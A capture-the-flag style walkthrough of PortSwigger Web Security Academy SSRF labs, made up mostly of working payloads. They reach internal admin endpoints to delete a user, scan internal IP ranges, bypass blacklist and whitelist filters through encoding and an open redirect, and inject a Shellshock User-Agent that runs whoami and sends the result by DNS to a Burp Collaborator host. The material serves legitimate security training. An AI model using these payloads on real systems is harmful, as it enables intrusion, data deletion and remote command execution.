# Server-side request forgery (SSRF)

## Common SSRF attacks

### Basic SSRF against the local server

1) Change the URL in _Check stock_ form to http://localhost/admin
2) Modify the URL from response https://ac3e1fe81ff21a7080613ef700fe00ba.web-security-academy.net/admin/delete?username=carlos
to http://localhost/admin/delete?username=carlos and use it the same way to delete the user

### Basic SSRF against another back-end system

Use Burp Suite Intruder to scan the network
```
stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
```

IP `192.168.0.20` responds with 200. Use the URL from response to delete Carlos
```
stockApi=http%3A%2F%2F192.168.0.20%3A8080%2Fadmin%2Fdelete%3fusername%3dcarlos
```

## Circumventing common SSRF defenses

### SSRF with blacklist-based input filters
Change `127.0.0.1` to `127.1` and double URL encode `a` in `admin`
```
stockApi=http://127.1/%2561dmin
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

### SSRF with whitelist-based input filter

Double encoded `#` in host
```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

### SSRF with filter bypass via open redirection vulnerability

`/product/nextProduct?path=foo` returns HTTP 302
```
stockApi=/product/nextProduct?path%3dhttp://192.168.0.12:8080/admin
stockApi=/product/nextProduct?path%3dhttp://192.168.0.12:8080/admin/delete?username%3dcarlos
```

## Blind SSRF vulnerabilities

### Blind SSRF with out-of-band detection
```
Referer: http://burpcollaborator.net
```

### Blind SSRF with Shellshock exploitation
```
GET /product?productId=1 HTTP/1.1
Host: ac961fd61f73d8dc807c03f100bb00fa.web-security-academy.net
Connection: close
Cache-Control: no-transform
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).1rt8(..).burpcollaborator.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Referer: http://192.168.0.§1§:8080
Accept-Encoding: gzip, deflate
Accept-Language: cs-CZ,cs;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=f1DZBykzdTJ2yqzaURtBwHCWqFgb6jD2
```

Notice `User-agent` (Shellshock) and `Referer` headers.
Start the attack (IPs from .1 to .255)
Burp Collaborator interaction: `peter-cqzxuc.1rt8ltf3qtpbp5r6uzgorv4syj49sy.burpcollaborator.net.`